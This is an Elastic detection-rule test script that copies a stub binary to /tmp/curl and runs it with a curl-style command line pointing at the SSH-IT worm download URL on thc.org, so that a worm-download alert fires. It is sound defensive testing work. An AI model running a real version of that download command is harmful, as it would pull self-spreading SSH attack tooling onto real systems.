# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys


@register_code_rta(
    id="3ad5efdc-c186-4dbd-b5ce-f8d1f102002c",
    platforms=[OSType.LINUX],
    endpoint_rules=[
        {
            "rule_name": "Potential SSH-IT SSH Worm Downloaded",
            "rule_id": "cb351778-7329-4de9-82b5-6705f772a3af",
        },
    ],
    siem_rules=[],
    techniques=["T1021", "T1563"],
)
@_common.requires_os(metadata.platforms)
def main() -> None:
    masquerade = "/tmp/curl"
    source = _common.get_path("bin", "linux.ditto_and_spawn")
    _common.copy_file(source, masquerade)

    # Execute command
    _common.log("Launching fake curl commands to download payload")
    _common.execute([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout=5, kill=True)

    # cleanup
    _common.remove_file(masquerade)


if __name__ == "__main__":
    sys.exit(main())
